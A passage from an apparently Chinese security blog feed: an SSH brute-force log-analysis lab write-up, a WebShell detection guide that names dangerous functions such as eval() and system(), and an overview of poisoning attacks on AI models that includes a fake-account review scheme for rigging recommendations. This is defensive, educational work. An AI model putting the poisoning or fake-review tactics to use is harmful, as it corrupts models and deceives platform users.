href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:#DF2A3F;background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:#DF2A3F;">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;boot.log</font></strong><font style="color:rgb(17, 17, 17);">：包含系统启动时的日志</font><a href="https://blog.csdn.net/konglongaa/article/details/54289852"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">2</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;daemon.log</font></strong><font style="color:rgb(17, 17, 17);">：包含各种系统后台守护进程的日志信息</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;dpkg.log</font></strong><font style="color:rgb(17, 17, 17);">：包括安装或使用</font><em><strong><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">dpkg</font></strong></em><font style="color:rgb(17, 17, 17);">命令清除软件包的日志</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;kern.log</font></strong><font style="color:rgb(17, 17, 17);">：包含内核产生的日志，有助于在定制内核时解决问题</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;lastlog</font></strong><font style="color:rgb(17, 17, 17);">：记录所有用户的最近信息。这不是一个ASCII文件，因此需要用</font><em><strong><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">lastlog</font></strong></em><font style="color:rgb(17, 17, 17);">命令查看内容</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;maillog</font></strong><font style="color:rgb(17, 17, 17);">或**&#x2F;var&#x2F;log&#x2F;mail.log**：包含系统运行电子邮件服务器的日志信息</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;user.log</font></strong><font style="color:rgb(17, 17, 17);">：记录所有等级用户信息的日志</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;Xorg.x.log</font></strong><font style="color:rgb(17, 17, 17);">：来自X的日志信息</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;alternatives.log</font></strong><font style="color:rgb(17, 17, 17);">：更新替代信息都记录在这个文件中</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;btmp</font></strong><font style="color:rgb(17, 17, 17);">：记录所有失败登录信息。使用</font><em><strong><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">last</font></strong></em><font style="color:rgb(17, 17, 17);">命令可以查看btmp文件</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;cups</font></strong><font style="color:rgb(17, 17, 17);">：涉及所有打印信息的日志</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;anaconda.log</font></strong><font style="color:rgb(17, 17, 17);">：在安装Linux时，所有安装信息都储存在这个文件中</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;yum.log</font></strong><font style="color:rgb(17, 17, 17);">：包含使用</font><em><strong><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">yum</font></strong></em><font style="color:rgb(17, 17, 17);">安装的软件包信息</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;cron</font></strong><font style="color:rgb(17, 17, 17);">：每当cron进程开始一个工作时，就会将相关信息记录在这个文件中</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;secure</font></strong><font style="color:rgb(17, 17, 17);">：包含验证和授权方面的信息</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;wtmp</font></strong><font style="color:rgb(17, 17, 17);">或**&#x2F;var&#x2F;log&#x2F;utmp**：包含登录信息。使用</font><em><strong><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">wtmp</font></strong></em><font style="color:rgb(17, 17, 17);">可以找出谁正在登录系统</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li><li><strong><font style="color:rgb(17, 17, 17);">&#x2F;var&#x2F;log&#x2F;faillog</font></strong><font style="color:rgb(17, 17, 17);">：包含用户登录失败信息</font><a href="https://blog.csdn.net/sforce/article/details/112477742"><sup><strong><font style="color:rgb(23, 74, 228);background-color:rgb(209, 219, 250);">1</font></strong></sup></a><font style="color:rgb(17, 17, 17);">。</font></li></ul><h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割<br>2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割<br>3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割<br>4.登陆成功的IP共爆破了多少次<br>5.黑客登陆主机后新建了一个后门用户，用户名是多少<br></code></pre></td></tr></table></figure><h3 id="1、有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#1、有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="1、有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>1、有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h3><p>看完auth.log 没什么东西再看auth.log.1</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748496070046-c6999d08-7c7d-4bc4-b570-d3f1780ab0f1-498609.png" alt="1748496070046-c6999d08-7c7d-4bc4-b570-d3f1780ab0f1.png"></p><p>cat auth.log.1 | grep -a “Failed password for root” | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more</p><p>awk ‘{print $11}’:</p><p>awk 是一个文本处理工具，用于按字段处理文本。</p><p>{print $11} 表示打印每行的第11个字段。假设日志格式为标准格式，第11个字段通常是IP地址。</p><p>sort:</p><p>sort 命令用于对输入行进行排序。</p><p>这里是对提取的IP地址进行排序。</p><p>uniq -c:</p><p>uniq 命令用于删除重复的行。</p><p>-c 选项表示对每个唯一的行计数，即统计每个IP地址的出现次数。</p><p>sort -nr:</p><p>sort 命令再次用于排序。</p><p>-n 选项表示按数值进行排序。</p><p>-r 选项表示按降序排序。</p><p>组合起来，即按出现次数从高到低排序。</p><p>more:</p><p>more 命令用于分页显示输出。</p><p>由于输出可能很长，more 命令允许用户逐页查看结果。</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748496189604-9126accf-995d-46aa-900d-4ae461784de3-216415.png" alt="1748496189604-9126accf-995d-46aa-900d-4ae461784de3.png"></p><p>192.168.200.2,192.168.200.31,192.168.200.32</p><h3 id="2、ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#2、ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="2、ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>2、ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h3><p>cat auth.log.1 | grep -a “Accepted “ | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748496366182-22198156-e89d-4d63-8aea-ca4646bd8e44-627182.png" alt="1748496366182-22198156-e89d-4d63-8aea-ca4646bd8e44.png"></p><p>192.168.200.2</p><h3 id="3、爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#3、爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="3、爆破用户名字典是什么？如果有多个使用”,”分割"></a>3、爆破用户名字典是什么？如果有多个使用”,”分割</h3><p>cat auth.log.1 | grep -a “Failed password” |perl -e ‘while($_&#x3D;&lt;&gt;){ &#x2F;for(.*?) from&#x2F;; print “$1\n”;}’|uniq -c|sort -nr</p><p><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">这个命令链的主要作用是分析</font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;auth.log.1&lt;/font&gt;</code><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">文件，提取出所有包含”Failed password”字符串的行，这通常表明有失败的登录尝试。然后，它使用Perl脚本提取出失败尝试的用户名和来源IP地址，统计每个用户名的失败尝试次数，并按照次数降序排列显示结果。</font></p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748496585017-39b16371-83e7-433f-a2f8-b17de60a918a-056418.png" alt="1748496585017-39b16371-83e7-433f-a2f8-b17de60a918a.png"></p><p><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">flag{user,hello,root,test3,test2,test1}</font></p><h3 id="4、登陆成功的IP共爆破了多少次"><a href="#4、登陆成功的IP共爆破了多少次" class="headerlink" title="4、登陆成功的IP共爆破了多少次"></a>4、登陆成功的IP共爆破了多少次</h3><p>cat auth.log.1 | grep -a “Failed password for root” | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more</p><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748496189604-9126accf-995d-46aa-900d-4ae461784de3-216415.png" alt="1748496189604-9126accf-995d-46aa-900d-4ae461784de3.png"></p><p>flag{4}</p><h3 id="5、黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#5、黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="5、黑客登陆主机后新建了一个后门用户，用户名是多少"></a>5、黑客登陆主机后新建了一个后门用户，用户名是多少</h3><p><font style="color:rgb(77, 77, 77);">那这里我们肯定就是找新建用户，因为题目也已经说明了.黑客登陆主机后新建了一个后门用户；</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">cat auth.log.1 |grep -a &quot;new user&quot;<br></code></pre></td></tr></table></figure><p><img src="/./img/9Gc65h5uwpj-ZBhO/1748496888018-a2a82258-ff08-4479-83da-b987fcfa4e51-372177.png" alt="1748496888018-a2a82258-ff08-4479-83da-b987fcfa4e51.png"></p><p>flag{test2}</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><blockquote><p>更新: 2025-05-29 13:35:59<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/be3xgfip9cxachqr">https://www.yuque.com/chaye-apqbl/vsc85q/be3xgfip9cxachqr</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/index/"/>
    <url>/2026/01/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/index/</url>
    
    <content type="html"><![CDATA[<h1 id="玄机靶场"><a href="#玄机靶场" class="headerlink" title="玄机靶场"></a>玄机靶场</h1><h1 id="一、什么是WebShell应急响应？"><a href="#一、什么是WebShell应急响应？" class="headerlink" title="一、什么是WebShell应急响应？"></a>一、什么是WebShell应急响应？</h1><p>简单官方一点：WebShell应急响应是指在检测到WebShell（恶意Web脚本）攻击后，采取一系列措施来控制、消除威胁，并恢复受影响的系统和服务。WebShell是一种常见的攻击手段，攻击者通过上传或注入恶意脚本到Web服务器上，从而获得对服务器的远程控制权限，而我们需要做的就是找到问题所在根源并且解决掉它。</p><p>当然也是很开心收到了师傅们给的玄机注册邀请码，马上注册就直奔应急响应例题。</p><p>玄机平台链接</p><p>注册需要邀请码，评论区留言看到就送。</p><h1 id="二、常规后门查杀"><a href="#二、常规后门查杀" class="headerlink" title="二、常规后门查杀"></a>二、常规后门查杀</h1><h2 id="1、手动排查webshell"><a href="#1、手动排查webshell" class="headerlink" title="1、手动排查webshell"></a>1、手动排查webshell</h2><h3 id="1-1、静态检测"><a href="#1-1、静态检测" class="headerlink" title="1.1、静态检测"></a>1.1、静态检测</h3><p>我们可以查找一些特殊后缀结尾的文件。例如：.asp、.php、.jsp、.aspx。</p><p>然后再从这类文件中查找后门的特征码，特征值，危险函数来查找webshell，例如查找内容含有exec()、eval()、system()的文件。</p><p>优点：快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。</p><p>缺点：漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。</p><h3 id="1-2、动态检测"><a href="#1-2、动态检测" class="headerlink" title="1.2、动态检测"></a>1.2、动态检测</h3><p>webshell执行时刻表现出来的特征，我们称为动态特征。只要我们把webshell特有的HTTP请求&#x2F;响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。webshell如果执行系统命令的话，会有进程。Linux下就是起了bash，Win下就是启动cmd，这些都是动态特征。</p><h3 id="1-3、日志检测"><a href="#1-3、日志检测" class="headerlink" title="1.3、日志检测"></a>1.3、日志检测</h3><p>使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，例如：一个平时是GET的请求突然有了POST请求并且返回代码为200。</p><h2 id="2、工具排查webshell"><a href="#2、工具排查webshell" class="headerlink" title="2、工具排查webshell"></a>2、工具排查webshell</h2><p>相对于手工排查，工具排查可能更好上手，但是如果想走的更远一些，某些线下的比赛可能会断网，也就说，手工排查的一些基本操作还是要明白的。（但是工具排查真的很香）</p><p>推荐一些查杀的平台工具（大部分都是在线端）</p><h3 id="1、阿里伏魔"><a href="#1、阿里伏魔" class="headerlink" title="1、阿里伏魔"></a>1、阿里伏魔</h3><p><a href="https://ti.aliyun.com/#/webshell">https://ti.aliyun.com/#/webshell</a></p><p>阿里伏地魔简介：</p><p>阿里伏地魔在线平台是一款功能强大的Web应用漏洞检测工具，通过自动化的扫描和检测，帮助开发者和安全团队发现和修复安全漏洞，提升Web应用的安全性。（操作简单容易上手）</p><p>在线一次只能上传2M大小的文件，对于一些大型网站，文件动则10几个G就显的有点鸡肋。</p><p><img src="/./img/0yXrMvftSPKcjo8k/1748423151322-36267149-32e7-4611-99a0-9229592a26d4-682567.png" alt="1748423151322-36267149-32e7-4611-99a0-9229592a26d4.png"></p><h3 id="2、河马"><a href="#2、河马" class="headerlink" title="2、河马"></a>2、河马</h3><p><a href="https://n.shellpub.com/">https://n.shellpub.com/</a></p><p>河马简介：</p><p>在线端河马是一款功能强大的Web应用安全检测工具，通过自动化的扫描和检测，帮助开发者和安全团队发现和修复安全漏洞，提升Web应用的安全性。</p><p>在线端河马的主要功能</p><p>漏洞扫描</p><p>提供全面的Web应用漏洞扫描，检测常见的安全漏洞，如SQL注入、跨站脚本攻击（XSS）、文件包含、命令注入等。</p><p>安全检测</p><p>检测Web应用的安全配置、代码质量和潜在漏洞，确保应用符合安全最佳实践。</p><p>报告生成</p><p>扫描完成后，生成详细的安全报告，包括发现的漏洞类型、严重程度、漏洞位置和修复建议。</p><p>修复建议</p><p>提供具体的修复建议，指导开发者如何修复代码中的安全漏洞。</p><p>持续监控</p><p>提供持续监控功能，可以定期扫描Web应用，及时发现新出现的安全漏洞。</p><p>API支持</p><p>提供API接口，方便集成到CI&#x2F;CD流水线中，实现自动化的安全检测。</p><p>河马是客户端的，而且在线的文件上传也是比阿里伏地魔稍微大那么一些（客户端目前没有接触暂时不知道多大），但是它的查杀能力确实没有阿里伏地魔那么强，可能跟上传的文件大小多少都有点关系吧</p><p><img src="/./img/0yXrMvftSPKcjo8k/1748423194946-300c3dcc-2c5d-4be8-aaa6-cd0bdee2cfef-968504.png" alt="1748423194946-300c3dcc-2c5d-4be8-aaa6-cd0bdee2cfef.png"></p><h3 id="3、CloudWalker-牧云"><a href="#3、CloudWalker-牧云" class="headerlink" title="3、CloudWalker(牧云)"></a>3、CloudWalker(牧云)</h3><p><a href="https://stack.chaitin.com/security-challenge/webshell/index">https://stack.chaitin.com/security-challenge/webshell/index</a></p><p>这里就不一一解释了，反正作用都大差不差，看大家习惯用哪一个吧；</p><p><img src="/./img/0yXrMvftSPKcjo8k/1748423204715-12723c95-52a2-4220-905e-d9a57d6a4ae2-363064.png" alt="1748423204715-12723c95-52a2-4220-905e-d9a57d6a4ae2.png"></p><h3 id="4、在线-webshell-查杀-灭绝师太版"><a href="#4、在线-webshell-查杀-灭绝师太版" class="headerlink" title="4、在线 webshell 查杀-灭绝师太版"></a>4、在线 webshell 查杀-灭绝师太版</h3><p><a href="http://tools.bugscaner.com/killwebshell/">http://tools.bugscaner.com/killwebshell/</a></p><p><img src="/./img/0yXrMvftSPKcjo8k/1748422832475-d4b013ef-b099-4225-a7b1-e03ae997655e-806826.png" alt="1748422832475-d4b013ef-b099-4225-a7b1-e03ae997655e.png"></p><h3 id="5、D盾"><a href="#5、D盾" class="headerlink" title="5、D盾"></a>5、D盾</h3><p><a href="https://www.d99net.net/">https://www.d99net.net/</a></p><p>D盾简介：</p><p>少有的客户端，常见的都是能查出来的而且也是很好操作易上手，可以说线下比赛断网必备吧用过的都说好！</p><p>D盾的优点</p><p>全面防护：提供多层次的安全防护功能，覆盖常见的Web攻击和安全威胁。</p><p>实时监控：实时监控Web服务器的运行状态和网络请求，及时发现和应对安全威胁。</p><p>易于使用：界面友好，配置和使用简单，适合各类用户。</p><p>日志分析：提供详细的日志和报告功能，帮助管理员识别和追踪攻击行为。</p><p><img src="/./img/0yXrMvftSPKcjo8k/1748422824183-72696abc-5e0b-4b72-822a-fe069bad78a8-611655.png" alt="1748422824183-72696abc-5e0b-4b72-822a-fe069bad78a8.png"></p><h3 id="6、微步在线"><a href="#6、微步在线" class="headerlink" title="6、微步在线"></a>6、微步在线</h3><p><a href="https://threatbook.cn/next/product/sandbox">https://threatbook.cn/next/product/sandbox</a></p><p>微步就不多说了，之前我内存取证分析病毒就是用它，效果没的说；</p><p><img src="/./img/0yXrMvftSPKcjo8k/1748422817832-9bbc2053-f866-4a5f-8924-d3e2683b23ee-867217.png" alt="1748422817832-9bbc2053-f866-4a5f-8924-d3e2683b23ee.png"></p><blockquote><p>更新: 2025-05-28 17:07:49<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/uhqbertwotd3p34h">https://www.yuque.com/chaye-apqbl/vsc85q/uhqbertwotd3p34h</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index/"/>
    <url>/2026/01/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index/</url>
    
    <content type="html"><![CDATA[<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p><a href="https://blog.csdn.net/qq1140037586/article/details/130582989">https://blog.csdn.net/qq1140037586/article/details/130582989</a></p><h2 id="ZJGSU校赛复现"><a href="#ZJGSU校赛复现" class="headerlink" title="ZJGSU校赛复现"></a>ZJGSU校赛复现</h2><blockquote><p>更新: 2025-05-28 15:26:47<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/udg4qgwrb10l4xa5">https://www.yuque.com/chaye-apqbl/vsc85q/udg4qgwrb10l4xa5</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/Prompt%E6%94%BB%E5%87%BB/%E4%BE%8B%E9%A2%98/"/>
    <url>/2026/01/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/Prompt%E6%94%BB%E5%87%BB/%E4%BE%8B%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h1 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h1><h2 id="大模型Prompt挑战一"><a href="#大模型Prompt挑战一" class="headerlink" title="大模型Prompt挑战一"></a><font style="color:rgb(255, 255, 255);background-color:rgb(40, 39, 44);">大模型Prompt挑战一</font></h2><p><img src="/./img/xkxe9m8BUGl8647U/1748394773905-92d1964d-a93a-42cd-a0d8-6362ad385de0-324913.png" alt="1748394773905-92d1964d-a93a-42cd-a0d8-6362ad385de0.png"></p><blockquote><p>更新: 2025-05-28 09:14:42<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/orupz95gsy2wqu3z">https://www.yuque.com/chaye-apqbl/vsc85q/orupz95gsy2wqu3z</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/"/>
    <url>/2026/01/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="大模型投毒攻击"><a href="#大模型投毒攻击" class="headerlink" title="大模型投毒攻击"></a>大模型投毒攻击</h1><h2 id="什么是大模型投毒实验？"><a href="#什么是大模型投毒实验？" class="headerlink" title="什么是大模型投毒实验？"></a><font style="color:rgb(79, 79, 79);">什么是大模型投毒实验？</font></h2><p><font style="color:rgb(77, 77, 77);">大模型投毒实验可以分为以下几种类型：</font></p><ul><li><strong><font style="color:rgba(0, 0, 0, 0.75);">数据投毒（Data Poisoning）</font></strong></li><li><strong><font style="color:rgba(0, 0, 0, 0.75);">模型中毒（Model Poisoning）</font></strong></li><li><strong><font style="color:rgba(0, 0, 0, 0.75);">后门攻击（Backdoor Attacks）</font></strong></li><li><strong><font style="color:rgba(0, 0, 0, 0.75);">1. 数据投毒（Data Poisoning）</font></strong></li></ul><p><strong><font style="color:rgba(0, 0, 0, 0.75);">数据投毒是指在模型训练过程中引入恶意或有偏的数据，导致模型学到错误或有害的模式。这种攻击可以通过以下几种方式实现：</font></strong></p><p><strong><font style="color:rgba(0, 0, 0, 0.75);"></font></strong></p><p><strong><font style="color:rgba(0, 0, 0, 0.75);">引入错误标签：在分类任务中，攻击者可以将训练数据的标签错误地分配给不同的类别。这样，模型在训练过程中会学习到错误的分类规则。例如，在一个猫狗分类任务中，将猫的图片标签为狗。</font></strong></p><p><img src="/./img/3u63JxIKrIzp85VC/1757815955215-176e34ef-49f5-47a3-a386-48990125a4aa-627357.png" alt="1757815955215-176e34ef-49f5-47a3-a386-48990125a4aa.png"></p><p><img src="/./img/3u63JxIKrIzp85VC/1757815980097-e71baf16-e4b0-45a3-802b-5705c1e2a009-652788.png" alt="1757815980097-e71baf16-e4b0-45a3-802b-5705c1e2a009.png"></p><p><img src="/./img/3u63JxIKrIzp85VC/1757816021312-6b621731-8f55-4472-a1d3-a4f9c353e1f3-749342.png" alt="1757816021312-6b621731-8f55-4472-a1d3-a4f9c353e1f3.png"></p><p><img src="/./img/3u63JxIKrIzp85VC/1757816036312-4e2c4fe1-98f8-473d-9a80-e8a476fcee54-118598.png" alt="1757816036312-4e2c4fe1-98f8-473d-9a80-e8a476fcee54.png"></p><h2 id="实际示例：推荐系统的投毒攻击"><a href="#实际示例：推荐系统的投毒攻击" class="headerlink" title="实际示例：推荐系统的投毒攻击"></a>实际示例：推荐系统的投毒攻击</h2><p>假设我们有一个电子商务平台的推荐系统，该系统使用机器学习模型来推荐用户可能感兴趣的产品。攻击者希望通过投毒攻击来提升某一特定产品的推荐概率。</p><p>攻击步骤：</p><p>数据投毒：攻击者购买大量该特定产品，并通过伪造的用户账户给该产品打高分，同时在评论中加入正面评价。这些数据被系统收集并用于训练推荐模型。</p><p>模型训练：由于训练数据集中包含了大量的伪造高分和正面评价，推荐系统在训练过程中会学到这个特定产品是用户喜欢的，从而提升其推荐概率。</p><p>验证效果：在系统上线后，攻击者的产品会频繁出现在用户的推荐列表中，达到了提升产品曝光率和销售的目的。</p><blockquote><p>更新: 2025-09-14 10:15:04<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gtcan1iu1a8ntefe">https://www.yuque.com/chaye-apqbl/vsc85q/gtcan1iu1a8ntefe</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/index/"/>
    <url>/2026/01/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%94%BB%E9%98%B2/index/</url>
    
    <content type="html"><![CDATA[<h1 id="大模型攻防"><a href="#大模型攻防" class="headerlink" title="大模型攻防"></a>大模型攻防</h1><blockquote><p>更新: 2025-05-28 09:08:43<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tg1bmgl4qaroirta">https://www.yuque.com/chaye-apqbl/vsc85q/tg1bmgl4qaroirta</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2026/01/19/%E5%8D%9A%E5%AE%A2/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><p><img src="/./img/nkzvmr4qvSkURkQn/1742629763197-3a36533a-1e0b-4656-9fdc-e8169229d2b9-872407.png" alt="1742629763197-3a36533a-1e0b-4656-9fdc-e8169229d2b9.png"></p><blockquote><p>更新: 2025-03-22 15:50:27<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tug0os3zixf6pvd0">https://www.yuque.com/chaye-apqbl/vsc85q/tug0os3zixf6pvd0</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/%E5%8D%9A%E5%AE%A2/Typora%E7%A0%B4%E8%A7%A3/"/>
    <url>/2026/01/19/%E5%8D%9A%E5%AE%A2/Typora%E7%A0%B4%E8%A7%A3/</url>
    
